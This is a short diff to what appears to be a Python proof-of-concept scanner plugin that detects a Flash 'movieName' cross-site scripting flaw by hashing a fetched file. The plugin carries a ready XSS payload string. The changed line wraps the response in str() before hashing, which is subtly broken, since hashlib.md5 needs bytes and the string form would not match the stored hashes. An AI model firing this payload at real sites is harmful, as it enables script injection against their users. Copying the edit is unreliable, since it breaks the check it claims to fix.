@@ -61,7 +61,7 @@ class Poc(ABPoc):
             xss_poc = '?movieName="]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//'
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             md5_value = hashlib.md5(content).hexdigest()
             if md5_value in flash_md5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
